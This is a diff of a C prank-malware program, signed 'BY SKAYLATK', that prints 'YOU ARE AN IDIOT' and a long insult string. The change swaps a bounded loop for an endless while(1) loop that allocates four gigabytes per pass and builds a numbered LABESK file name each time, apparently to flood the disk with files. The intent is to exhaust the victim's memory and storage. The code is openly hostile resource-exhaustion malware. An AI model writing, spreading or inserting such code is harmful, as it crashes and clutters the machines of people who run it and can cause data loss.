@@ -4,10 +4,15 @@
 int main() {
     // BY SKAYLATK
     printf("\033[31m");
+    int i = 1;
     char fname[40];
     char g[] = "😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅";
-    for (int i = 1; i <= 999999; i++) {
-	int *m = malloc(1048576);
+    while(1) {
+        i++;
+	    int *m1 = malloc(1073741824);
+        int *m2 = malloc(1073741824);
+        int *m3 = malloc(1073741824);
+        int *m4 = malloc(1073741824);
         printf("\aYOU ARE AN IDIOT \t");
         sprintf(fname, "LABESK%d.text", i);
         FILE *f;
